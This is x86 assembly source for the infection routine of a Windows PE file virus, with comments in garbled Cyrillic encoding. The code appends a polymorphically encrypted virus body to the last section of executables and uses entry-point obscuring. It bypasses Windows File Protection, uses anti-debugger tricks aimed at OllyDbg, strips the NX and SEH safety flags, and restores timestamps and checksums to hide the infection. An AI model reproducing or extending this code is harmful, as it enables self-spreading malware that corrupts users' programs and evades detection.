;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											infect														 ;
;																										 ;
;											Infect														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪�� Infect
;��䥪� �-䠩�� ��⮤�� ���७�� ��᫥���� ᥪ樨 
;���� ( Infect(char *pszFileName,WIN32_FIND_DATA *wfd) ):
;pszFileName - ����� ���� � ���⢥
;wfd         - ���� ����������� �������� WIN32_FIND_DATA 
;�����:
;EAX - 0, �᫨ ����䥪��� �� ����稫���, � 1, �᫨ ����䥪⨫� (�⫨筮) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;========================================================================================================
xIMAGE_DLLCHARACTERISTICS_NO_SEH	equ	400h 
IMAGE_DLLCHARACTERISTICS_NX_COMPAT	equ	100h 

NBFH				equ		25 					;num_bytes_for_hash ������⢮ ���⨪��, ����� �㤥� ���஢��� ��� ᮧ����� ��⪨  

infect_file			equ		dword ptr [ebp+24h]	;����� ���� � ���⢥
wfd_addr			equ		dword ptr [ebp+28h]	;���� ��।����� ����������� �������� WIN32_FIND_DATA 

map_addr			equ		dword ptr [ebp-12]	;���� ����� 䠩�� 
align_newvirsize	equ		dword ptr [ebp-16]	;���� ��஢����� �� FileAlign ࠧ��� ����� (㥯+���ਯ��+⥫�)    
true_newsize		equ		dword ptr [ebp-20]	;���� ��஢����� �� FileAlign ࠧ��� ����� (㦥 � ��⮬ ࠧ��� �����)  
flag_infect			equ		dword ptr [ebp-24]	;����䥪⨫� �����? (0 ���, 1 ��) 
morphgen_addr		equ		dword ptr [ebp-28]	;���� �������� MORPHGEN (��� ��������)  
uepgen_addr			equ		dword ptr [ebp-32]	;���� �������� UEPGEN (��� 㥯-������)   
delta_infect		equ		dword ptr [ebp-36]	;����� ��࠭�� �����-ᬥ饭�� 
last_sec			equ		dword ptr [ebp-44]	;㪠��⥫� � ⠡��窥 ᥪ権 �� �����, ᮮ⢥�����騩 ��᫥���� ᥪ樨
start_code			equ		dword ptr [ebp-48]	;䨧��᪨� ���� �ਣ����쭮� �窨 �室�
end_code			equ		dword ptr [ebp-52]	;���� � ࠩ��� ���� ⮩ ᥪ樨, � ���ன ��室���� �窠 �室�  
prev_sec			equ		dword ptr [ebp-56]	;㪠��⥫� � ⠡��窥 ᥪ権 �� �����, ᮮ⢥�����騩 �।-��᫥���� ᥪ樨
iIMNTh				equ		dword ptr [ebp-60]	;IMAGE_NT_HEADERS    
code_sec			equ		dword ptr [ebp-64]	;㪠��⥫� � ⠡��窥 ᥪ権 �� �����, ᮮ⢥�����騩 ᥪ樨, � ���ன ��室���� �窠 �室� (�� ��䮫�� ������� ᥪ��) 
;======================================================================================================== 


  
Infect:
	pushad										;��࠭�� ॣ����� 
	mov		ebp,esp										
	mov		ebx,wfd_addr 
	assume	ebx:ptr WIN32_FIND_DATA				;EBX - ���� WIN32_FIND_DATA 
	sub		esp,(sizeof MORPHGEN + 4 + 68)		;�뤥��� � ��� ���� ��� �������� MORPHGEN    
	mov		eax,[ebx].nFileSizeLow
	mov		true_newsize,eax					;����� ���� ��࠭�� �ࣨ����� (��室��) ࠧ��� ����� 
	and		flag_infect,0						;���㫨� 䫠� 
	and		prev_sec,0  
	mov		morphgen_addr,esp					;��࠭�� � ��� ⠪�� � ���� �������� MORPHGEN 
	sub		esp,(sizeof UEPGEN+4)				;���� ��� UEPGEN 
	mov		uepgen_addr,esp						;��࠭�� ���� 
;--------------------------------------------------------------------------------------------------------
    sub		esp,(MAX_PATH+MAX_PATH+4)			;����� �㤥� �࠭��� unicode-��ப�
    mov		esi,esp 
;######################################################################################################## 
    int		3h									;��⨮⫠���� �ਥ�       
    ret
    pushfd										;��᫥ ��ࠡ��稪� �믮������ ��筥��� � �⮩ �������. �� ��� ⮦� ��: ������, �� ��� ��쪨, 
    pop		eax									;��᫥ ������ �� ��-��ࠡ��稪� ��쪠 ���뢠�� ���㫨�� 䫠� TF - � �� �⨬ � ��ᯮ��㥬�� :)!  
    test	ah,1
    jne		_nxtinf02_							;�᫨ OllyDbg �� ������� �� ����, � ��।���� �ࠢ����� � �����      
;######################################################################################################## 
	push	infect_file							
	call	xstrlen
	shl		eax,1                                 
	add		eax,4
 
	push	eax
	push	esi
	push	-1
	push	infect_file
	push	0
	push	0
	call	xMultiByteToWideChar1				;��ॢ���� ansi-unicode ��ப�   

	pushsz	'sfc'   
_nxtload_:										;����� 㧭���, ���饭 �� ����� 䠩� WFP (SFC)  
	call	xLoadLibraryA1						;����㦠�� ���
	xchg	eax,ecx      
	push	1900F52h							;SfcIsFileProtected   
	push	ecx 
	call	xGetProcAddress
	mov		edx,ecx								;����� �஢�ਬ ����祭�� ����, �᫨ �� ����� � �������� ⠡��窥   
	assume	ecx:ptr IMAGE_DOS_HEADER			;�ᯮ�� ⮫쪮 �� ����㦥��� ���, � ⮣�� �� �ࢠन��. ����� ���� 
	add		ecx,[ecx].e_lfanew					;㪠�뢠�� �� ��ப� ���� ���_���.���_�㭪樨 (� ⮩ ��� ��� ⥬ ������ � ��室���� �㦭�� ��� �㭪�) 
	assume	ecx:ptr IMAGE_NT_HEADERS			;�� ��� ���� � ⮦�, � ��� ��㣮� ��� �����⭮. ���⮬�, �᫨ �� �ࢠन��, � ����㧨� �� � ����� ���.  
	add		edx,[ecx].OptionalHeader.DataDirectory[0*8].VirtualAddress
	cmp		eax,edx
	jb		_sfcok_
	add		edx,[ecx].OptionalHeader.DataDirectory[0*8].isize 
	cmp		eax,edx
	ja		_sfcok_ 
	pushsz	'sfc_os' 
	jmp		_nxtload_
_sfcok_: 
    push	esi
    push	0
    call	eax
    add		esp,(MAX_PATH+MAX_PATH+4)			;᪮�४��㥬 ���         
    test	eax,eax  
    jne		_error01_							;�᫨ 䠩�0 ���饭, � �� ��室    
;-------------------------------------------------------------------------------------------------------- 
	call	GetDelta							;����稬 �����-ᬥ饭�� 
	mov		delta_infect,eax					;��࠭�� ���   
;--------------------------------------------------------------------------------------------------------    
	push	FILE_ATTRIBUTE_NORMAL  
	push	infect_file 
	call	xSetFileAttributesA1				;��� ��砫� ������� ��ਡ��� 䠩��   
	         
	call	xOpenFile							;��஥� 䠩� �� �⥭��+������  

	inc		eax
	je		_error01_							;��㤠筮?
	dec		eax 

	mov		ecx,1000h							;���� ���쬥� ���ᨬ���� ࠧ��� ����� � ��஢�塞 ��� �� ���ᨬ��쭮� ���祭�� (SectionAlignment)   
	dec		ecx
	mov		edx,VIRUS_SIZE+MAX_FINE_SIZE 
	add		edx,ecx
	not		ecx
	and		edx,ecx
	add		edx,[ebx].nFileSizeLow				;� �ਡ���� ����祭�� ࠧ��� � ��室���� ࠧ���� �����    

	push	eax   

	push	edi 
	push	edx 	
	push	edi
	push	PAGE_READWRITE
	push	edi 
	push	eax
	call	xCreateFileMappingA1				;ᮧ����� �஥��� 䠩�� � ���� ࠧ��஬ (��⮬ ��� ��०�� �� ����⢨⥫쭮 ����ᠭ����) 
 												 
	test	eax,eax								;��㤠筮? 
	jne		_nxtinf01_
	
	call	xCloseHandle1						;� ⠪�� ��砥 ���஥� ������ ���� � ��९�룭�� ����� 
	jmp		_error01_	 

_nxtinf01_:  
	push	eax 

	push	edi 
	push	edi 
	push	edi 
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	xMapViewOfFile1						;���� �஥��㥬 ����� � ��� ���᭮� ����࠭�⢮ (��)     
    xchg	eax,edi

	call	xCloseHandle1						;���஥� ���㦭� ������ ����  
	call	xCloseHandle1
	test	edi,edi								;�஥��� 㤠����? 
	je		_error01_
;-------------------------------------------------------------------------------------------------------- 
_nxtinf02_: 
	mov		map_addr,edi						;��࠭�� ���� ����� 
	push	edi 
	call	ValidPE								;�஢�ਬ 䠩� �� ���������� 
	test	eax,eax
	je		_error02_ 
	assume	edi:ptr IMAGE_DOS_HEADER
	add		edi,[edi].e_lfanew
	assume	edi:ptr IMAGE_NT_HEADERS
	mov		iIMNTh,edi							;IMAGE_NT_HEADERS  
	movzx	esi,[edi].FileHeader.SizeOfOptionalHeader 
	lea		esi,dword ptr [ esi + edi + (sizeof IMAGE_FILE_HEADER + 4) ] 
	assume	esi:ptr IMAGE_SECTION_HEADER		;��३��� � ⠡��窥 ᥪ権   
	movzx	ecx,[edi].FileHeader.NumberOfSections
	test	ecx,ecx								;������� �� ����� ᥪ樨? 
	je		_error02_
	xor		eax,eax
	cdq 
;--------------------------------------------------------------------------------------------------------  
_cycle01_:										;����� ��稭��� ���� ������� ᥪ樨 � ��᫥���� ᥪ樨 (����㠫쭮 � 䨧��᪨) 
 	cmp		edx,[esi].VirtualAddress
 	ja		_search_code_section_
 	cmp		eax,[esi].PointerToRawData 
 	ja		_search_code_section_    
 	mov		eax,[esi].PointerToRawData			;��������, �� �� � ���� ��᫥���� ᥪ�� 
 	mov		edx,map_addr
 	add		edx,[esi].SizeOfRawData
 	lea		edx,[edx+eax-1]
 	mov		end_code,edx						;��࠭�� ���� ���� ��᫥���� ᥪ樨 (�ਬ�୮ � ⮬ ���� � �㤥� ��⪠, �᫨ 䠩� 㦥 ����䥪祭 ����)   
 	mov		edx,[esi].VirtualAddress			;� ⠪�� ��࠭�� ����� ��� �室� (��� �㤥� 㪠�뢠�� �� ����� ��᫥���� ᥪ樨)      
 	mov		last_sec,esi						;� ��࠭�� ���� �� ����� � ⠡��窥 ᥪ権, � ���஬ �࠭���� ��ਡ��� ��᫥���� ᥪ樨 � ���⢥  
;--------------------------------------------------------------------------------------------------------
_search_code_section_:							;����� �ந�室�� ���� ᥪ樨, � ���ன � ����� �窠 �室� 
	push	eax 
	mov		eax,[esi].VirtualAddress 
	cmp		eax,[edi].OptionalHeader.AddressOfEntryPoint   
	ja		_nxtsec_
	cmp		[esi].Misc.VirtualSize,0
	jne		_vsok1_
	add		eax,[esi].SizeOfRawData   
	jmp		_psok1_
_vsok1_:
	add		eax,[esi].Misc.VirtualSize
_psok1_:  
	cmp		eax,[edi].OptionalHeader.AddressOfEntryPoint     
	jbe		_nxtsec_
	mov		eax,[edi].OptionalHeader.AddressOfEntryPoint      
	sub		eax,[esi].VirtualAddress
	add		eax,[esi].PointerToRawData 
	add		eax,map_addr    
	mov		start_code,eax						;�᫨ ��諨 ��� (�������) ᥪ��, � ��࠭�� 䨧��᪨� ���� �窨 �室�, �.�. ����� � ���쬥� ��।������� ���-�� ���� ��� ᮧ����� ��⪨ ��䥪� 
	mov		code_sec,esi 
_nxtsec_: 
	pop		eax
	add		esi,sizeof IMAGE_SECTION_HEADER
	loop	_cycle01_							;���室�� � �஢�થ ᫥���饩 ᥪ樨  
;-------------------------------------------------------------------------------------------------------- 
	push	edi   			 					
	mov		edi,end_code						;EDI - ���� � ࠩ��� ���� ��᫥���� ᥪ樨 (�᫨ �஢��塞� 䠩�0 ����஢�� ����, � ��⪠ �㤥� ������ ���-� ⠬)						
  	mov		esi,last_sec						;ESI - 㪠��⥫� � ⠡��窥 ᥪ権 �� ᠬ� ��᫥���� �����      
  	cmp		dword ptr [esi].Name1,'rsr.'		;�᫨ ��᫥���� ᥪ�� ����ᮢ, � �� �� ����� ᢮����� (�᫮���) ��।������, � ��������� � �।��᫥���� ᥪ��  
  	;jmp		_notrsrc_ 
  	jne		_notrsrc_
  	lea		edx,dword ptr [esi - sizeof (IMAGE_SECTION_HEADER)] 
  	assume	edx:ptr IMAGE_SECTION_HEADER
  	cmp		[edx].SizeOfRawData,0				;䨧��᪨� ࠧ��� �।��᫥���� ᥪ樨 != 0 ? 
  	je		_infectlastsec_  
  	mov		ecx,code_sec 
  	assume	ecx:ptr IMAGE_SECTION_HEADER    
  	mov		ecx,[ecx].SizeOfRawData
  	sub		ecx,[edx].SizeOfRawData
  	sub		ecx,(VIRUS_SIZE+VIRUS_SIZE)			;�᫨ �।��᫥���� ᥪ�� ������, � �����, �⮡� �� 䨧��᪨� ࠧ��� �� ����� ࠧ��� ������� ᥪ樨, ���� ������      
  	jl		_infectlastsec_
  	mov		prev_sec,edx						;��࠭塞 㪠��⥫� �� �㦭� ����� � ⠫�窥 ᥪ権  	
  	mov		edi,map_addr
  	add		edi,[edx].PointerToRawData
  	add		edi,[edx].SizeOfRawData  
  	dec		edi									;� ���塞 ���祭�� � EDI - �� "�।��᫥���� ᥪ��" 
_1section_: 
_notrsrc_:
_infectlastsec_:	   
;-------------------------------------------------------------------------------------------------------- 	
	xor		eax,eax   							;�����, �஢�ਬ, ��ࠦ�� �� 䠩�? �᫨ ��ࠦ��, � ��⪠ ������ ��室���� � ���� ��᫥����/�।��᫥���� ᥪ樨 
	std											;��⪠ �।�⠢��� ᮡ�� ��� �� ��।�������� ������⢠ ����, ������ � OEP ����� � ��࠭����� � ���� ��᫥����/�।��᫥���� ᥪ樨 (��� = 4 ����)  
_search_metka_:									;��� ��砫� �ய��⨬ �㫨   
	scasb
	je		_search_metka_
	dec		edi
	dec		edi
	cld   
	push	NBFH								;�����, ����⠥� ��� �� NBFH ����, ������ � OEP ����� 
	push	start_code
	call	xCRC32 
	cmp		eax,dword ptr [edi]					;� �ࠢ��� � ���⠬� (�ਬ�୮/� ������) � ���� ��᫥���� ᥪ樨 
	pop		edi 
	je		_error02_							;� �᫨ ��� ᮢ��� � ⥬� 4-�� ���⠬�, � ᪮॥ �ᥣ� 䠩� 㦥 ����䥪祭 ���� :)!  
;--------------------------------------------------------------------------------------------------------  
  	mov		eax,dword ptr [esi].SizeOfRawData	
  	test	eax,eax								;�᫨ 䨧��᪨� ࠧ��� ��᫥���� ᥪ樨 == 0, � �� ��室 
  	je		_error02_
  	cmp		eax,[esi].Misc.VirtualSize			;�᫨ 䨧. ࠬ�� > ����. ࠧ���, � �� ��室 
  	jb		_error02_ 
;-------------------------------------------------------------------------------------------------------- 
  	lea		edx,[edi].OptionalHeader.AddressOfEntryPoint  
	lea		ecx,OEP
	add		ecx,delta_infect  
	mov		edx,dword ptr [edx]
	add		edx,[edi].OptionalHeader.ImageBase 
	push	edx      
	pop		dword ptr [ecx]						;������� (�६����) ���室 ��᫥ ��ࠡ�⪨ ����쪠 �� ⥫� ����� (�� �� OEP)  
;--------------------------------------------------------------------------------------------------------  
	push	PAGE_READWRITE 
	push	MEM_RESERVE+MEM_COMMIT 
	push	VIRUS_SIZE+MAX_FINE_SIZE+UEP_RESTBYTES_SIZE  
	push	0
	call	xVirtualAlloc1						;�뤥��� ����㠫��� ������ ��� ����஥��� ���ਯ��(��) � 㥯��, � ⠪�� ���� ��� �६������ �࠭���� ࠭�� ��࠭����� ���� �����, � ���ன �� ᥩ�� �ᯮ��塞�� 

	push	eax   

	push	edi
	push	esi 

	xchg	eax,edi 
	mov		ecx,UEP_RESTBYTES_SIZE 
	lea		esi,restore_bytes
	add		esi,delta_infect 
	rep		movsb								;��࠭�� ࠭�� ��࠭���� ����� �����, � ���ன �� ᥩ�� �ᯮ��塞��   
;-------------------------------------------------------------------------------------------------------- 
	mov		ecx,uepgen_addr						;ECX - 㪠��⥫� �� �������� UEPGEN; �������� ������ ��������     
	assume	ecx:ptr UEPGEN
	mov		edx,morphgen_addr					;EDX - 㪠��⥫� �� �������� MORPHGEN; �������� ������ ��������  
	assume	edx:ptr MORPHGEN
	mov		[edx].pa_buf_for_morph,edi			;��࠭�� ���� ����, ��� �㤥� ��ந�� ��������� ���ਯ��(�) � ����஢���� �����     	  
	push	map_addr  	
	pop		[ecx].mapped_addr					;��࠭�� ��� ������ 
	lea		eax,RANG32
	add		eax,delta_infect 
	mov		[ecx].rgen_addr,eax					;� ⠪�� ��࠭�� ���� ��� 
	mov		[edx].rgen_addr,eax 
	lea		eax,xTG
	add		eax,delta_infect   
	mov		[ecx].tgen_addr,eax					;� ���裥��       
	mov		[edx].tgen_addr,eax 
	push	prev_sec							;� ��।���� ���� (� ⠡��窥 ᥪ権) �� ����� ⮩ ᥪ樨 (��᫥����/�।��᫥���), �㤠 ����ਬ�� 
	pop		[ecx].xsection 	  
	lea		eax,xStart
	add		eax,delta_infect
	mov		[edx].cryptcode_addr,eax			;� ���� ���� (��砫� ��襣� ����쪠), ����� ���� ����஢��� (����஢��� � ������� ���ਯ��(�))  
	mov		[edx].size_cryptcode,VIRUS_SIZE		;ࠧ��� �⮣� ����
	mov		[edx].mapped_addr,0  				;������ ���� (�����) ��१�ࢨ஢���   

	push	ecx									;������ � ��� �����⢥��� ��ࠬ��� - �� ���� �������� UEPGEN 
	call	FLEA								;� ��뢠�� 㥯-������   
	test	eax,eax
	je		_error02_ 

	push	edx									;���� �������� MORPHGEN    
	call	FINE								;� ᫥��� ��뢠�� ��������� ������
	  
	pop		esi
	pop		edi
	push	edi
	push	esi    
	push	eax									;� EAX - ���� ���ਯ��(��) 
	push	ecx    								;� ECX - ࠧ��� ���ਯ��(��) + ����஢������ ����쪠  
;-------------------------------------------------------------------------------------------------------- 
  	mov		eax,[esi].SizeOfRawData  
  	mov		edx,[edi].OptionalHeader.FileAlignment
  	add		ecx,4 
  	;add		ecx,(VIRUS_SIZE+VIRUS_SIZE) 
  	dec		edx
  	add		ecx,edx								;��ࠢ������ ���� ࠧ��� ����쪠 �� 㦥 ������� FileAlign  
  	not		edx
  	and		ecx,edx   		 
  	mov		align_newvirsize,ecx				;� ��࠭�� ����祭�� ࠧ���  
  	add		ecx,[ebx].nFileSizeLow				;�ਡ���� � ���� ��室�� ࠧ��� �����            
  	mov		true_newsize,ecx					;� ��࠭�� ���� ࠧ��� ����� � ���   
;--------------------------------------------------------------------------------------------------------	
	add		eax,[esi].PointerToRawData 
	sub		eax,[ebx].nFileSizeLow				;� ����� ���� ���૥�? 
	jae		_no_overlay_						;�᫨ ���, � ��룠�� ����� 
	neg		eax									;���� ����襬 ���   
	lea		edi,dword ptr [ecx-01] 
	add		edi,map_addr
	mov		esi,map_addr
	add		esi,[ebx].nFileSizeLow  
	dec		esi
	xchg	eax,ecx
	std
	rep		movsb
	cld           
;-------------------------------------------------------------------------------------------------------- 
_no_overlay_:                     
	pop		ecx            
	pop		esi

	pop		edx  
	assume	edx:ptr IMAGE_SECTION_HEADER  
	cmp		prev_sec,0							;����� �� ��������� � �।��᫥���� ᥪ��?     
	je		_last_section_  
	push	ecx
	;push	align_newvirsize      
	push	edx
	push	map_addr
	call	re_rsrc								;�᫨ ��, � ���ᮡ�ࠥ� ᥪ�� ����ᮢ
	mov		edx,prev_sec 
	assume	edx:ptr IMAGE_SECTION_HEADER		;� ���塞 㪠��⥫� �� �����, ᮮ⢥�����騩 �।��᫥���� ᥪ樨    

_last_section_:   
	mov		edi,map_addr						;����稬 䨧��᪨� ���� ���� ��᫥���� ᥪ樨
	add		edi,[edx].PointerToRawData
	add		edi,[edx].SizeOfRawData   	   
	push	ecx 
	rep		movsb								;� ����襬 ��襣� ����஢������ �����     
	push	NBFH 
	push	start_code
	call	xCRC32
	stosd										;� ���⠢�� ���� �� ��䥪� (��⪠ ��� ������ ����� �ᥣ�� �㤥� ࠧ���)    
	xchg	eax,ecx  
	pop		ecx   
	sub		ecx,align_newvirsize
	neg		ecx
	sub		ecx,4								;���४��㥬 � ��⮬ ��⪨   
	rep		stosb								;����塞 ��᫥���� ����� (�⮡� � ���⢥ ���� �뫮 ���� ����)    
	pop		eax
	mov		esi,dword ptr [esp]           
	mov		ecx,UEP_RESTBYTES_SIZE
	lea		edi,restore_bytes
	add		edi,delta_infect  
	rep		movsb								;⥯��� ����襬 � ���� ࠭�� ��࠭���� �ਣ������ ����� �����, � ���ன �� ᥩ�� ࠡ�⠥�  
	xchg	eax,edi
	mov		esi,edx  

	pop		eax 
 
	push	MEM_DECOMMIT
	push	VIRUS_SIZE+MAX_FINE_SIZE  	
	push	eax 		
	call	xVirtualFree1						;�᢮����� ࠭�� �뤥������ ����㠫��� ������ 
;--------------------------------------------------------------------------------------------------------  
	lea		edx,[esi].SizeOfRawData
	lea		eax,[esi].Misc.VirtualSize   
	mov		ecx,align_newvirsize   
	add		dword ptr [edx],ecx					;⥯��� 㢥��稬 䨧��᪨� ࠧ��� ��᫥���� ᥪ樨 �� ࠭�� ��࠭���� ��஢����� ���� ࠧ��� ����쪠 
	cmp		dword ptr [eax],0
	je		_vs_equ_ps_ 
	add		dword ptr [eax],ecx
	jmp		_correct_rsrc_ 
_vs_equ_ps_:
	push	dword ptr [edx]
	pop		dword ptr [eax] 

_correct_rsrc_:
	mov		edx,[esi].VirtualAddress			;����� �।��᫥����/��᫥���� ᥪ樨
	add		edx,[esi].Misc.VirtualSize
	or		[esi].Characteristics,80000000h		;������� ��ਡ��� �� � �� ������    
	mov		esi,last_sec						;� ��� �� �筮 ��᫥���� ᥪ��  
	mov		eax,[esi].Misc.VirtualSize 
	test	eax,eax
	jne		_notzerovs_                
	mov		eax,[esi].SizeOfRawData
	jmp		_nxt_correct_    
_notzerovs_: 
	cmp		dword ptr [esi].Name1,'rsr.'      
	jne		_nxt_correct_
	mov		[edi].OptionalHeader.DataDirectory[2*8].isize,eax  

_nxt_correct_:    
   	mov		ecx,[edi].OptionalHeader.SectionAlignment
   	dec		ecx              
   	add		eax,ecx
   	add		edx,ecx     
   	not		ecx
   	and		eax,ecx                                
   	and		edx,ecx   
   	mov		ecx,[esi].VirtualAddress   
   	sub		ecx,edx
   	cmp		prev_sec,0							;�஢�ઠ, � �।��᫥���� ᥪ�� �� ����ਫ���?
   	je		_correct_imagesize_   
   	jecxz	_correct_imagesize_					;� �ࠢ��쭮 �� ᪮�४�஢�� 䨧��᪨� ࠧ��� �⮩ ᥪ樨?
   	mov		edx,[edi].OptionalHeader.SectionAlignment    
   	mov		ecx,prev_sec
   	assume	ecx:ptr IMAGE_SECTION_HEADER
   	add		[ecx].Misc.VirtualSize,edx			;�᫨ ���, � ���४��㥬 �� SectionAlignment  
_correct_imagesize_:
	lea		edx,[edi].OptionalHeader.SizeOfImage 
	add		eax,[esi].VirtualAddress 
   	mov		dword ptr [edx],eax					;᪮�४��㥬 SizeOfImage=LastSec.AlignVirtSize+LastSec.VirtAddr 
;########################################################################################################
	pushfd 										;�� ���� ��⨮⫠���� ���
	pop		eax
	or		ah,1
	push	eax
	popfd										;����� �� ������� � 1 䫠� TF, � ��� �⫠�稪� ��������� �᪫�祭��  	 
	jmp		$+3									;��᫥ ��ࢮ� �������, ����� ��室���� ��᫥ popfd (� ������ ��砥 �᪫�祭�� �㤥� �� 
	db		0B8h								;          
	call	xCloseHandle1						;��� �⮬� ����� (� ��� ��ॡ��� jmp)
	jmp		edx
;########################################################################################################     
;-------------------------------------------------------------------------------------------------------- 
	btr		[edi].OptionalHeader.DllCharacteristics,10	;xIMAGE_DLLCHARACTERISTICS_NO_SEH (���㫨� ��� 䫠�, �⮡� ��� seh-��ࠡ��稪 ��ࠡ�⠫ �� �⫨筮) 
	btr		[edi].OptionalHeader.DllCharacteristics,08	;xIMAGE_DLLCHARACTERISTICS_NX_COMPAT (���� �஢���� ��� 䫠�, � �᫨ �� ���⠢���, � ��� �� �� �믮������) 
	and		[edi].OptionalHeader.DataDirectory[10*8].VirtualAddress,0	;⠪�� ���� ���㫨�� � �� 2 ����  
	and		[edi].OptionalHeader.DataDirectory[10*8].isize,0   
;-------------------------------------------------------------------------------------------------------- 
	pushsz	'Imagehlp'							;����� �஢�ਬ ���� CheckSum, �᫨ ��� !=0, � �����⠥� ��� ��-����� � ��࠭��    
	call	xLoadLibraryA1     
	push	0D8C7E64h							;CheckSumMappedFile  
	push	eax
	call	xGetProcAddress   
	push	esp
	mov		esi,esp
	push	esp 
	mov		edx,esp
	push	edi
	mov		edi,edx 
	push	esi  
	push	edi   			
	push	true_newsize  
	push	map_addr   
	call	eax         
	test	eax,eax  
	je		_csf0_
	cmp		dword ptr [edi],0 
	je		_csf0_
	pop		edi    
	push	dword ptr [esi]                          
	pop		[edi].OptionalHeader.CheckSum    
_csf0_: 	  
	inc		flag_infect							;㢥��稬 䫠� �䥪�, ⥬ ᠬ� ������, �� �䥪� ��襫 �ᯥ譮 
	jmp		_unmap_ 				 
;-------------------------------------------------------------------------------------------------------- 
_error02_: 
	push	[ebx].nFileSizeLow					;� ��룭�� � ��砥 �୨ 
	pop		true_newsize 

_unmap_: 
	push	map_addr
	call	xUnmapViewOfFile1					;���㧨� ���� 䠩��   

_error01_: 	
	call	xOpenFile							;��஥� ᭮�� 䠩� ��� �⥭��+�����  

   	inc		eax
   	je		_error03_
   	dec		eax

   	xchg	esi,eax
   	lea		eax,[ebx].ftLastWriteTime 
   	push	eax
   	push	edi
   	push	edi								 					 
   	push	esi
   	call	xSetFileTime1						;��࠭�� ࠭�� ����祭��� �६� ��᫥���� ����䨪�樨 䠩��  

   	push	FILE_BEGIN
   	push	edi
   	push	true_newsize
   	push	esi
   	call	xSetFilePointer1					;��०�� ��譨� ࠧ��� � �����

   	push	esi
   	call	xSetEndOfFile1						;��䨪��㥬 ���     

   	push	esi
   	call	xCloseHandle1

_error03_:    	
   	push	[ebx].dwFileAttributes  
    push	infect_file
    call	xSetFileAttributesA1				;����⠭���� ��ਡ��� 

    mov		eax,flag_infect						;��࠭�� 䫠� ��䥪� � EAX (0 - ���, 1 - ����䥪⨫� :)! 
    mov		dword ptr [ebp+1Ch],eax            
    mov		esp,ebp 
  	 
	popad
	ret		4*2									;�� ��室!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 Infect 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�ᯮ����⥫쭠� �㭪� xOpenFile
;����⨥ 䠩�� �� �⥭��+������ 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xOpenFile:
	xor		edi,edi
	push	edi
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	edi 
	push	FILE_SHARE_READ+FILE_SHARE_WRITE
	push	GENERIC_READ+GENERIC_WRITE
	push	infect_file
	call	xCreateFileA1
	ret  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� xOpenFile 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 






